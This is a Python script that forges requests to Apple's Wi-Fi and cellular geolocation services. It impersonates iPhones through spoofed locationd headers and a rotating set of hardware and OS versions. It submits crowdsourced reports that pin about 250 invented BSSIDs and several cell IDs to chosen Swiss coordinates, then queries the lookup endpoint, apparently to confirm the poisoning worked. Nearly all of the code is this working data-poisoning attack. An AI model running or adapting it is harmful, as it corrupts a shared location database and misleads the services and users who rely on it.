import subprocess
from utils import *
import random


WLOC_ENDPOINT = 'https://gs-loc.apple.com/clls/wloc'
PBCWLOC_ENDPOINT = 'https://gsp10-ssl.apple.com/hcy/pbcwloc'
APLOC_ENDPOINT = 'https://gsp10-ssl.ls.apple.com/hvr/aploc'

HEADERS_WLOC = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'locationd/2890.16.16 CFNetwork/1496.0.7 Darwin/23.5.0',
    'Accept': '*/*',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'close'
}

HEADERS_PBCWLOC_APLOC = {
    'Connection': 'keep-alive',
    'User-Agent': 'locationd/2890.16.16 CFNetwork/1496.0.7 Darwin/23.5.0',
    'Accept': '*/*',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
}

ios_hardware_versions = {
    "D53pAP": ["iPhone OS16.7.7/20H330", "iPhone OS16.7.8/20H343", "iPhone OS17.5.1/21F90"],  # iPhone 12 Pro
    "D53gAP": ["iPhone OS16.7.7/20H330", "iPhone OS16.7.8/20H343", "iPhone OS17.5.1/21F90"],  # iPhone 12
    "D63AP": ["iPhone OS17.1.2/21B101", "iPhone OS17.5.1/21F90", "iPhone OS17.5/21F79"],  # iPhone 13 Pro
    "D17AP": ["iPhone OS17.1.2/21B101", "iPhone OS17.5.1/21F90", "iPhone OS17.5/21F79"],  # iPhone 13
    "D73AP": ["iPhone OS17.5/21F79", "iPhone OS17.4.1/21E237", "iPhone OS17.5.1/21F90"],  # iPhone 14 Pro
    "D27AP": ["iPhone OS17.5/21F79", "iPhone OS17.4.1/21E237", "iPhone OS17.5.1/21F90"],  # iPhone 14
    "D83AP": ["iPhone OS17.5.1/21F90"],  # iPhone 15 Pro
    "D37AP": ["iPhone OS17.5.1/21F90"]  # iPhone 15
}

unknown_bssids = ['ac:d7:5b:0c:95:00', 'ac:d7:5b:0c:95:01', 'ac:d7:5b:0c:95:02', 'ac:d7:5b:0c:95:03',
                  'ac:d7:5b:0c:95:04', 'ac:d7:5b:0c:95:05', 'ac:d7:5b:0c:95:06', 'ac:d7:5b:0c:95:07',
                  'ac:d7:5b:0c:95:08', 'ac:d7:5b:0c:95:09', 'ac:d7:5b:0c:95:0a', 'ac:d7:5b:0c:95:0b',
                  'ac:d7:5b:0c:95:0c', 'ac:d7:5b:0c:95:0d', 'ac:d7:5b:0c:95:0e', 'ac:d7:5b:0c:95:0f',
                  'ac:d7:5b:0c:95:11', 'ac:d7:5b:0c:95:12', 'ac:d7:5b:0c:95:13', 'ac:d7:5b:0c:95:14',
                  'ac:d7:5b:0c:95:15', 'ac:d7:5b:0c:95:16', 'ac:d7:5b:0c:95:17', 'ac:d7:5b:0c:95:19',
                  'ac:d7:5b:0c:95:1a', 'ac:d7:5b:0c:95:1b', 'ac:d7:5b:0c:95:1c', 'ac:d7:5b:0c:95:1d',
                  'ac:d7:5b:0c:95:1e', 'ac:d7:5b:0c:95:1f', 'ac:d7:5b:0c:95:20', 'ac:d7:5b:0c:95:21',
                  'ac:d7:5b:0c:95:22', 'ac:d7:5b:0c:95:23', 'ac:d7:5b:0c:95:24', 'ac:d7:5b:0c:95:25',
                  'ac:d7:5b:0c:95:26', 'ac:d7:5b:0c:95:27', 'ac:d7:5b:0c:95:28', 'ac:d7:5b:0c:95:29',
                  'ac:d7:5b:0c:95:2a', 'ac:d7:5b:0c:95:2b', 'ac:d7:5b:0c:95:2c', 'ac:d7:5b:0c:95:2d',
                  'ac:d7:5b:0c:95:2e', 'ac:d7:5b:0c:95:2f', 'ac:d7:5b:0c:95:30', 'ac:d7:5b:0c:95:31',
                  'ac:d7:5b:0c:95:32', 'ac:d7:5b:0c:95:33', 'ac:d7:5b:0c:95:34', 'ac:d7:5b:0c:95:35',
                  'ac:d7:5b:0c:95:36', 'ac:d7:5b:0c:95:37', 'ac:d7:5b:0c:95:38', 'ac:d7:5b:0c:95:39',
                  'ac:d7:5b:0c:95:3a', 'ac:d7:5b:0c:95:3b', 'ac:d7:5b:0c:95:3c', 'ac:d7:5b:0c:95:3d',
                  'ac:d7:5b:0c:95:3e', 'ac:d7:5b:0c:95:3f', 'ac:d7:5b:0c:95:41', 'ac:d7:5b:0c:95:42',
                  'ac:d7:5b:0c:95:43', 'ac:d7:5b:0c:95:44', 'ac:d7:5b:0c:95:45', 'ac:d7:5b:0c:95:46',
                  'ac:d7:5b:0c:95:47', 'ac:d7:5b:0c:95:49', 'ac:d7:5b:0c:95:4a', 'ac:d7:5b:0c:95:4b',
                  'ac:d7:5b:0c:95:4c', 'ac:d7:5b:0c:95:4d', 'ac:d7:5b:0c:95:4e', 'ac:d7:5b:0c:95:4f',
                  'ac:d7:5b:0c:95:51', 'ac:d7:5b:0c:95:52', 'ac:d7:5b:0c:95:53', 'ac:d7:5b:0c:95:54',
                  'ac:d7:5b:0c:95:55', 'ac:d7:5b:0c:95:56', 'ac:d7:5b:0c:95:57', 'ac:d7:5b:0c:95:59',
                  'ac:d7:5b:0c:95:5a', 'ac:d7:5b:0c:95:5b', 'ac:d7:5b:0c:95:5c', 'ac:d7:5b:0c:95:5d',
                  'ac:d7:5b:0c:95:5e', 'ac:d7:5b:0c:95:5f', 'ac:d7:5b:0c:95:60', 'ac:d7:5b:0c:95:61',
                  'ac:d7:5b:0c:95:62', 'ac:d7:5b:0c:95:63', 'ac:d7:5b:0c:95:64', 'ac:d7:5b:0c:95:65',
                  'ac:d7:5b:0c:95:66', 'ac:d7:5b:0c:95:67', 'ac:d7:5b:0c:95:68', 'ac:d7:5b:0c:95:69',
                  'ac:d7:5b:0c:95:6a', 'ac:d7:5b:0c:95:6b', 'ac:d7:5b:0c:95:6c', 'ac:d7:5b:0c:95:6d',
                  'ac:d7:5b:0c:95:6e', 'ac:d7:5b:0c:95:6f', 'ac:d7:5b:0c:95:70', 'ac:d7:5b:0c:95:71',
                  'ac:d7:5b:0c:95:72', 'ac:d7:5b:0c:95:73', 'ac:d7:5b:0c:95:74', 'ac:d7:5b:0c:95:75',
                  'ac:d7:5b:0c:95:76', 'ac:d7:5b:0c:95:77', 'ac:d7:5b:0c:95:79', 'ac:d7:5b:0c:95:7a',
                  'ac:d7:5b:0c:95:7b', 'ac:d7:5b:0c:95:7c', 'ac:d7:5b:0c:95:7d', 'ac:d7:5b:0c:95:7e',
                  'ac:d7:5b:0c:95:7f', 'ac:d7:5b:0c:95:81', 'ac:d7:5b:0c:95:82', 'ac:d7:5b:0c:95:83',
                  'ac:d7:5b:0c:95:84', 'ac:d7:5b:0c:95:85', 'ac:d7:5b:0c:95:86', 'ac:d7:5b:0c:95:87',
                  'ac:d7:5b:0c:95:89', 'ac:d7:5b:0c:95:8a', 'ac:d7:5b:0c:95:8b', 'ac:d7:5b:0c:95:8c',
                  'ac:d7:5b:0c:95:8d', 'ac:d7:5b:0c:95:8e', 'ac:d7:5b:0c:95:8f', 'ac:d7:5b:0c:95:90',
                  'ac:d7:5b:0c:95:91', 'ac:d7:5b:0c:95:92', 'ac:d7:5b:0c:95:93', 'ac:d7:5b:0c:95:94',
                  'ac:d7:5b:0c:95:95', 'ac:d7:5b:0c:95:96', 'ac:d7:5b:0c:95:97', 'ac:d7:5b:0c:95:98',
                  'ac:d7:5b:0c:95:99', 'ac:d7:5b:0c:95:9a', 'ac:d7:5b:0c:95:9b', 'ac:d7:5b:0c:95:9c',
                  'ac:d7:5b:0c:95:9d', 'ac:d7:5b:0c:95:9e', 'ac:d7:5b:0c:95:9f', 'ac:d7:5b:0c:95:a1',
                  'ac:d7:5b:0c:95:a2', 'ac:d7:5b:0c:95:a3', 'ac:d7:5b:0c:95:a4', 'ac:d7:5b:0c:95:a5',
                  'ac:d7:5b:0c:95:a6', 'ac:d7:5b:0c:95:a7', 'ac:d7:5b:0c:95:a9', 'ac:d7:5b:0c:95:aa',
                  'ac:d7:5b:0c:95:ab', 'ac:d7:5b:0c:95:ac', 'ac:d7:5b:0c:95:ad', 'ac:d7:5b:0c:95:ae',
                  'ac:d7:5b:0c:95:af', 'ac:d7:5b:0c:95:b1', 'ac:d7:5b:0c:95:b2', 'ac:d7:5b:0c:95:b3',
                  'ac:d7:5b:0c:95:b4', 'ac:d7:5b:0c:95:b5', 'ac:d7:5b:0c:95:b6', 'ac:d7:5b:0c:95:b7',
                  'ac:d7:5b:0c:95:b9', 'ac:d7:5b:0c:95:ba', 'ac:d7:5b:0c:95:bb', 'ac:d7:5b:0c:95:bc',
                  'ac:d7:5b:0c:95:bd', 'ac:d7:5b:0c:95:be', 'ac:d7:5b:0c:95:bf', 'ac:d7:5b:0c:95:c1',
                  'ac:d7:5b:0c:95:c2', 'ac:d7:5b:0c:95:c3', 'ac:d7:5b:0c:95:c4', 'ac:d7:5b:0c:95:c5',
                  'ac:d7:5b:0c:95:c6', 'ac:d7:5b:0c:95:c7', 'ac:d7:5b:0c:95:c9', 'ac:d7:5b:0c:95:ca',
                  'ac:d7:5b:0c:95:cb', 'ac:d7:5b:0c:95:cc', 'ac:d7:5b:0c:95:cd', 'ac:d7:5b:0c:95:ce',
                  'ac:d7:5b:0c:95:cf', 'ac:d7:5b:0c:95:d0', 'ac:d7:5b:0c:95:d1', 'ac:d7:5b:0c:95:d2',
                  'ac:d7:5b:0c:95:d3', 'ac:d7:5b:0c:95:d4', 'ac:d7:5b:0c:95:d5', 'ac:d7:5b:0c:95:d6',
                  'ac:d7:5b:0c:95:d7', 'ac:d7:5b:0c:95:d8', 'ac:d7:5b:0c:95:d9', 'ac:d7:5b:0c:95:da',
                  'ac:d7:5b:0c:95:db', 'ac:d7:5b:0c:95:dc', 'ac:d7:5b:0c:95:dd', 'ac:d7:5b:0c:95:de',
                  'ac:d7:5b:0c:95:df', 'ac:d7:5b:0c:95:e1', 'ac:d7:5b:0c:95:e2', 'ac:d7:5b:0c:95:e3',
                  'ac:d7:5b:0c:95:e4', 'ac:d7:5b:0c:95:e5', 'ac:d7:5b:0c:95:e6', 'ac:d7:5b:0c:95:e7',
                  'ac:d7:5b:0c:95:e9', 'ac:d7:5b:0c:95:ea', 'ac:d7:5b:0c:95:eb', 'ac:d7:5b:0c:95:ec',
                  'ac:d7:5b:0c:95:ed', 'ac:d7:5b:0c:95:ee', 'ac:d7:5b:0c:95:ef', 'ac:d7:5b:0c:95:f0',
                  'ac:d7:5b:0c:95:f1', 'ac:d7:5b:0c:95:f2', 'ac:d7:5b:0c:95:f3', 'ac:d7:5b:0c:95:f4',
                  'ac:d7:5b:0c:95:f5', 'ac:d7:5b:0c:95:f6', 'ac:d7:5b:0c:95:f7', 'ac:d7:5b:0c:95:f8',
                  'ac:d7:5b:0c:95:f9', 'ac:d7:5b:0c:95:fa', 'ac:d7:5b:0c:95:fb', 'ac:d7:5b:0c:95:fc',
                  'ac:d7:5b:0c:95:fd', 'ac:d7:5b:0c:95:fe', 'ac:d7:5b:0c:95:ff']

unknown_cells = [(228, 4, 22438, 9810857), (228, 4, 12646, 8634656), (228, 4, 51081, 2017823),
                 (228, 4, 26972, 2590892), (228, 4, 15440, 7325878), (228, 4, 38688, 2689713),
                 (228, 4, 4778, 8497034), (228, 4, 15826, 9831222), (228, 4, 46684, 3863409),
                 (228, 4, 53480, 6933072)]


def create_forged_cells(mcc, mnc, num_cells):
    cells = []
    for _ in range(num_cells):
        lac = random.randint(100, 65535)  # Générer un LAC aléatoire dans une plage cohérente
        cell_id = random.randint(1000000, 9999999)  # Générer un Cell ID aléatoire dans une plage cohérente
        cells.append((mcc, mnc, lac, cell_id))
    return cells


def create_wloc_wifi_request(bssids, os_version, device_model):
    """
    Crée une requête WlocRequest avec des informations Wi-Fi.

    Args:
        bssids (list of str or str): Liste des BSSIDs ou un seul BSSID à inclure dans la requête.
        os_version (str): Version du système d'exploitation.
        device_model (str): Modèle de l'appareil.

    Returns:
        bytes: La requête WlocRequest sérialisée en bytes.
    """
    request = WlocRequest.WlocRequest()

    # Si un seul BSSID est fourni, le convertir en liste
    if isinstance(bssids, str):
        bssids = [bssids]

    for bssid in bssids:
        wifi_request = request.wifi_request.add()
        wifi_request.bssid = bssid

    request.info_mask = 0
    request.channel = 1
    request.unknown_varint31 = 1
    request.unknown_varint32 = 2

    client_info = request.client_info
    client_info.os_version = os_version
    client_info.device_model = device_model

    # Convertir la requête en bytes
    request_bytes = request.SerializeToString()

    # Calculer la longueur du message Protobuf et la convertir en bytes
    protobuf_length = len(request_bytes)
    length_bytes = protobuf_length.to_bytes(2, byteorder='big')

    # Partie fixe en hexadécimal avant le Protobuf
    fixed_hex_part = "0001000a656e2d3030315f3030310013636f6d2e6170706c652e6c6f636174696f6e64000c31372e352e312e3231463930000000010000"
    fixed_bytes = bytes.fromhex(fixed_hex_part)

    # Combiner les deux parties
    full_request_bytes = fixed_bytes + length_bytes + request_bytes
    return full_request_bytes


def send_request(endpoint, request_bytes, headers):
    try:
        response = requests.post(endpoint, data=request_bytes, headers=headers)
        response.raise_for_status()
        return response.content
    except requests.exceptions.RequestException as e:
        print(f"Erreur de requête : {e}")
        return None


def create_wloc_cell_request(cells, os_version, device_model):
    request = WlocRequest.WlocRequest()

    for cell in cells:
        if isinstance(cell, (tuple, list)) and len(cell) == 4:
            cellular_request = request.cellular_request2.add()
            cellular_request.mcc = cell[0]
            cellular_request.mnc = cell[1]
            cellular_request.lac = cell[2]
            cellular_request.cell_id = cell[3]
        else:
            print(f"Invalid cell format: {cell}")

    request.unknown_varint31 = 1  # Valeur fixe
    request.unknown_varint32 = 2  # Valeur fixe

    client_info = request.client_info
    client_info.os_version = os_version
    client_info.device_model = device_model

    # Convertir la requête en bytes
    request_bytes = request.SerializeToString()

    # Calculer la longueur du message Protobuf
    protobuf_length = len(request_bytes)

    # Convertir la longueur en bytes (big-endian)
    length_bytes = protobuf_length.to_bytes(2, byteorder='big')

    # Partie fixe en hexadécimal avant le Protobuf
    fixed_hex_part = "0001000a656e2d3030315f3030310013636f6d2e6170706c652e6c6f636174696f6e64000c31372e352e312e3231463930000000010000"
    fixed_bytes = bytes.fromhex(fixed_hex_part)

    # Combiner les deux parties
    full_request_bytes = fixed_bytes + length_bytes + request_bytes
    return full_request_bytes


def create_pbcwloc_wifi_request(bssids, os_version, hardware_version, base_latitude, base_longitude, base_altitude, base_timestamp):
    request = PbcwlocRequest.PbcwlocRequest()

    # Fill in the device information
    device_info = request.device_info
    device_info.hardware_version = hardware_version
    device_info.os_version = os_version
    timestamp = convert_to_cocoa_core_data_timestamp(base_timestamp)

    # Add Wi-Fi requests
    for bssid in bssids:
        wifi_req = request.wifi_request.add()
        wifi_req.bssid = bssid
        wifi_req.channel = random.randint(1, 11)
        wifi_req.signal_strength = random.randint(-90, -30)
        wifi_req.location_info.latitude = base_latitude + random.uniform(-0.001, 0.001)
        wifi_req.location_info.longitude = base_longitude + random.uniform(-0.001, 0.001)
        wifi_req.location_info.horizontal_accuracy = random.uniform(5.0, 50.0)  # Précision horizontale en mètres
        wifi_req.location_info.altitude = base_altitude + random.uniform(-0.001, 0.001)
        wifi_req.location_info.vertical_accuracy = random.uniform(3.0, 20.0)  # Précision verticale en mètres
        wifi_req.location_info.timestamp = timestamp
        wifi_req.location_info.unknown_varint13 = 1
        wifi_req.location_info.unknown_varint16 = 0
        wifi_req.location_info.unknown_varint17 = 0
        wifi_req.location_info.inner_data18.inner_varint1 = 1
        wifi_req.location_info.inner_data18.inner_varint2 = 2
        wifi_req.location_info.inner_data19.inner_varint1 = 1
        wifi_req.location_info.inner_data19.inner_varint2 = 2
        wifi_req.location_info.inner_data20.inner_varint1 = 1
        wifi_req.location_info.inner_data20.inner_varint1 = 2
        wifi_req.unknown_varint7 = 0
        wifi_req.timestamp = timestamp
        wifi_req.unknown_varint9 = 1

    # Serialize the request to bytes
    request_bytes = request.SerializeToString()
    # Calculate the length of the Protobuf message
    protobuf_length = len(request_bytes)

    # Convert the length to bytes (big-endian)
    length_bytes = protobuf_length.to_bytes(2, byteorder='big')

    # Fixed hex part before the Protobuf
    fixed_hex_part = "0001000a656e2d3030315f3030310013636f6d2e6170706c652e6c6f636174696f6e64000d31372e342e312e323145323336000000640000"
    fixed_bytes = bytes.fromhex(fixed_hex_part)

    # Combine the fixed part with the Protobuf length and the serialized request
    full_request_bytes = fixed_bytes + length_bytes + request_bytes
    print("REQUEST PBCWLOC WIFI\n ", full_request_bytes.hex())
    return full_request_bytes


def create_pbcwloc_cell_request(cells, os_version, hardware_version, base_latitude, base_longitude, base_altitude, base_timestamp, operator_name):
    request = PbcwlocRequest.PbcwlocRequest()

    # Remplir les informations de l'appareil
    device_info = request.device_info
    device_info.hardware_version = hardware_version
    device_info.os_version = os_version
    timestamp = convert_to_cocoa_core_data_timestamp(base_timestamp)

    # Ajouter les requêtes Cellulaires
    for cell in cells:
        cell_req = request.cellular_request.add()
        cell_req.mcc, cell_req.mnc, cell_req.lac, cell_req.cell_id = cell
        cell_req.EARFCN_DL = random.randint(0, 65535)
        cell_req.PCI = random.randint(0, 503)
        cell_req.band_info = random.randint(1, 10)
        cell_req.location_info.latitude = base_latitude + random.uniform(-0.001, 0.001)
        cell_req.location_info.longitude = base_longitude + random.uniform(-0.001, 0.001)
        cell_req.location_info.horizontal_accuracy = random.uniform(5.0, 50.0)  # Précision horizontale en mètres
        cell_req.location_info.altitude = base_altitude + random.uniform(-0.001, 0.001)
        cell_req.location_info.vertical_accuracy = random.uniform(3.0, 20.0)  # Précision verticale en mètres
        cell_req.location_info.timestamp = timestamp
        cell_req.location_info.unknown_varint13 = 1
        cell_req.location_info.unknown_varint16 = 1
        cell_req.location_info.unknown_varint17 = 1 # 1 ou 0
        cell_req.location_info.inner_data18.inner_varint1 = 5
        cell_req.location_info.inner_data18.inner_varint2 = 2
        cell_req.location_info.inner_data19.inner_varint1 = 5
        cell_req.location_info.inner_data19.inner_varint2 = 2
        cell_req.location_info.inner_data20.inner_varint1 = 5
        cell_req.location_info.inner_data20.inner_varint2 = 2
        cell_req.operator = operator_name
        cell_req.unknown_double11 = 0.0
        cell_req.unknown_double12 = 0.0
        cell_req.unknown_varint14 = 1
        cell_req.unknown_varint15 = 1
        cell_req.unknown_varint16 = 1

        pbcwloc_string = cell_req.string
        substring = pbcwloc_string.substring.add()
        substring.unknown_varint1 = 1
        substring.unknown_varint2 = 1
        substring.unknown_varint3 = 1
        substring.unknown_varint4 = 1
        substring.unknown_varint5 = 1
        substring.unknown_varint6 = 1

        cell_req.unknown_varint22 = 1
        cell_req.unknown_varint23 = 1
        cell_req.operator_bis = operator_name
        cell_req.unknown_varint25 = 1
        cell_req.unknown_varint31 = 0
        cell_req.unknown_varint32 = 1
        cell_req.unknown_varint34 = 1
        cell_req.unknown_varint35 = 0

    # Convertir la requête en bytes
    request_bytes = request.SerializeToString()
    # Calculer la longueur du message Protobuf
    protobuf_length = len(request_bytes)

    # Convertir la longueur en bytes (big-endian)
    length_bytes = protobuf_length.to_bytes(2, byteorder='big')

    # Partie fixe en hexadécimal avant le Protobuf
    fixed_hex_part = "0001000a656e2d3030315f3030310013636f6d2e6170706c652e6c6f636174696f6e64000c31372e352e312e3231463930000000640000"
    fixed_bytes = bytes.fromhex(fixed_hex_part)

    # Combiner les deux parties
    full_request_bytes = fixed_bytes + length_bytes + request_bytes
    print("REQUEST PBCWLOC CELL\n ", full_request_bytes.hex())
    return full_request_bytes



# Fonction pour envoyer des requêtes avec différentes versions d'OS et de matériels
def send_pbcwloc_requests():
    base_latitude_w = 46.389400
    base_longitude_w = 6.584250
    base_altitude_w = 520

    for hardware_version, os_versions in ios_hardware_versions.items():
        for os_version in os_versions:
            base_timestamp = datetime.now(pytz.utc)
            request_bytes = create_pbcwloc_wifi_request(unknown_bssids, os_version, hardware_version, base_latitude_w,
                                                       base_longitude_w, base_altitude_w, base_timestamp)
            print(f"SENDING WIFI REQUESTS AT {base_timestamp}")
            response_wifi = send_request(PBCWLOC_ENDPOINT, request_bytes, HEADERS_PBCWLOC_APLOC)
            if response_wifi:
                print("RESPONSE PBCWLOC WiFi: \n", response_wifi.hex())

            base_latitude_c = 46.322830
            base_longitude_c = 6.965690
            base_altitude_c = 405
            base_timestamp_c = datetime.now(pytz.utc)
            request_bytes = create_pbcwloc_cell_request(unknown_cells, os_version, hardware_version, base_latitude_c,
                                                       base_longitude_c, base_altitude_c, base_timestamp_c, "Swisscom")
            print(f"SENDING CELLULAR REQUESTS AT {base_timestamp_c}")
            response_cell = send_request(PBCWLOC_ENDPOINT, request_bytes, HEADERS_PBCWLOC_APLOC)
            if response_cell:
                print("RESPONSE PBCWLOC Cell: \n", response_cell.hex())


def query_db(response_cells, response_wifis):
    os_version = "iPhone OS17.5.1/21F90"
    device_model = "iPhone14,2"

    print(f"QUERYING DB AT {datetime.now(pytz.utc)}")

    request_bytes_cell = create_wloc_cell_request(unknown_cells, os_version, device_model)
    response_cell = send_request(WLOC_ENDPOINT, request_bytes_cell, HEADERS_WLOC)
    if response_cell:
        print("RESP WLOC CELL: \n", response_cell.hex())
        response_cells.append(response_cell)

    request_bytes_wifi = create_wloc_wifi_request(unknown_bssids, os_version, device_model)
    response_wifi = send_request(WLOC_ENDPOINT, request_bytes_wifi, HEADERS_WLOC)
    if response_wifi:
        print("RESP WLOC WIFI: \n", response_wifi.hex())
        response_wifis.append(response_wifi)

    return response_cell, response_wifi